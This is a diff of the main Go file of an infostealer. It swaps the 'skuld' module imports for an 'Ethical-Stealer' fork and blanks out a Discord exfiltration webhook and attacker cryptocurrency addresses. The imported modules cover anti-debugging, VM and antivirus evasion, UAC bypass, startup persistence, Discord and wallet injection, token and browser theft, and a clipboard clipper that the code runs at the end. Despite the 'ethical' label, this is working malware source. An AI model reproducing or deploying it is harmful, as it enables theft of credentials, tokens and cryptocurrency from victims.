@@ -1,41 +1,41 @@
 package main
 
 import (
-	"github.com/hackirby/skuld/modules/antidebug"
-	"github.com/hackirby/skuld/modules/antivm"
-	"github.com/hackirby/skuld/modules/antivirus"
-	"github.com/hackirby/skuld/modules/browsers"
-	"github.com/hackirby/skuld/modules/clipper"
-	"github.com/hackirby/skuld/modules/commonfiles"
-	"github.com/hackirby/skuld/modules/discodes"
-	"github.com/hackirby/skuld/modules/discordinjection"
-	"github.com/hackirby/skuld/modules/fakeerror"
-	"github.com/hackirby/skuld/modules/games"
-	"github.com/hackirby/skuld/modules/hideconsole"
-	"github.com/hackirby/skuld/modules/startup"
-	"github.com/hackirby/skuld/modules/system"
-	"github.com/hackirby/skuld/modules/tokens"
-	"github.com/hackirby/skuld/modules/uacbypass"
-	"github.com/hackirby/skuld/modules/wallets"
-	"github.com/hackirby/skuld/modules/walletsinjection"
-	"github.com/hackirby/skuld/utils/program"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/antidebug"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/antivm"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/antivirus"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/browsers"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/clipper"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/commonfiles"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/discodes"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/discordinjection"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/fakeerror"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/games"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/hideconsole"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/startup"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/system"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/tokens"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/uacbypass"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/wallets"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/walletsinjection"
+    "github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/utils/program"
 )
 
 func main() {
 	CONFIG := map[string]interface{}{
-		"webhook": "https://discord.com/api/webhooks/1404262220283777084/HcXgJ4ICZsS-yjTaM_AQuCKl-GxoxJZBcGucKRqK6wxpE4oAAfYQYQ-d8hcgPrgIimYR",
+		"webhook": "Change webhook",
 		"cryptos": map[string]string{
-			"BTC": "bc1qdvmgkdve7shhduz9tclwsrq2rpwzwhj48c98x3",
-			"BCH": "qzc02j2gxzxcerv0mwdshrch7t25al3c0sk880n8rf",
-			"ETH": "0xec470C277c8B18D6124e65F5920329Aadd643B88",
+			"BTC": "",
+			"BCH": "",
+			"ETH": "",
 			"XMR": "",
-			"LTC": "LYDgVKX7iWRaSDuD25D7pmFX2uYmZVFDM9",
+			"LTC": "",
 			"XCH": "",
-			"XLM": "GCBFNHXCFVZTS6AZALKTZGUI64PZGPFTGIXKDZROB2JVZYSDDKKP3K7X",
-			"TRX": "TUKnXrzBuYiRe3vyoMFEzKSk1vtZ48F54G",
-			"ADA": "addr1qxpdudc5v80c8mzync6umhgjst3aa3w35xqca9h73pe0rpvzmcm3gcwls0kyf834ehw39qhrmmzargvp36t0azrj7xzsfyqkcn",
-			"DASH": "XtdoFwXLMRKnSWNh2RhL1iSgdtQo3u5Git",
-			"DOGE": "D5J7Efw1SikEuzQ65NioYaucbfSADg6NNQ",
+			"XLM": "",
+			"TRX": "",
+			"ADA": "",
+			"DASH": "",
+			"DOGE": "",
 		},
 	}
 
@@ -83,3 +83,4 @@ func main() {
 
 	clipper.Run(CONFIG["cryptos"].(map[string]string))
 }
+
